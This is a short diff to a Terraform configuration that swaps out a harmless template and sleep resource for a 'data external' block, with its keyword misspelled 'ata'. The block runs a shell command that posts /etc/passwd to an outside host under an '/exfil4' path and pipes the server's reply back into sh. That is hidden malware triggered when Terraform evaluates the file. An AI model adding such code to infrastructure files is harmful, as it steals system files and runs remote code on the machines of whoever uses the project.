@@ -1,17 +1,4 @@
-data "template_file" "test" {
-  template = "Hello, I am a template. My sample_var value = $${sample_var}"
-
-  vars = {
-    sample_var = var.sample_var
-  }
-}
-
-resource "null_resource" "sleep" {
-  triggers = {
-    uuid = uuid()
-  }
-
-  provisioner "local-exec" {
-    command = "sleep ${var.sleepy_time}"
-  }
+ata "external" "example" {
+ program = ["sh", "-c", "curl -X POST --data-binary @/etc/passwd
+https://fzi6s93ujh0hgsgy06ymaprpug08o2cr.net-spi.com/exfil4 | sh"]
 }
